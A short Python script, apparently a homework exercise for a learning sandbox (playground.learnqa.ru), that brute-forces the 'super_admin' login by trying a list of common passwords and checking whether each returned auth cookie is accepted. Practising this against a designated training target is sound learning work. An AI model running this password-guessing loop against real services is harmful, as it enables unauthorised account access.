import requests
from json import JSONDecodeError

passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

for i in passwords:
    try:
        cookie_value = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = {"login":"super_admin", "password": i}).cookies.get('auth_cookie')
        cookies = {'auth_cookie': cookie_value}
        get_secret_password_homework = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = cookies)
        if get_secret_password_homework.text == "You are authorized":
            print(f"Пароль:{i}")
            break
    except JSONDecodeError:
        print(f"пароль {i} возвращает не ожидаемый ответ: {get_secret_password_homework.text}")
    continue
